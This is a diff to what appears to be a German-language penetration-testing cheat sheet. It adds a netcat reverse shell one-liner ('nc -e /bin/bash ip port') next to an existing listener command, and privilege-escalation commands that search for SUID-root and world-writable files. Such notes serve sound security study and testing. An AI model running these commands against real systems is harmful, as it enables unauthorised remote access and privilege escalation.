@@ -157,11 +157,21 @@ Listening shell:
 nc -lvnp 4000
 ```
 
+Reverse shell:
+```bash
+nc -e "/bin/bash" ip port
+```
+
 # Privilege Escalation
 
 ---
 
 Datei mit SUID bit gesetzt:
-```
+```bash
 find / -user root -perm -4000 -print 2>/dev/null | head -20
+```
+
+Falsch konfigurierte Dateiattribute:
+```bash
+find / -type f -perm 0777
 ```
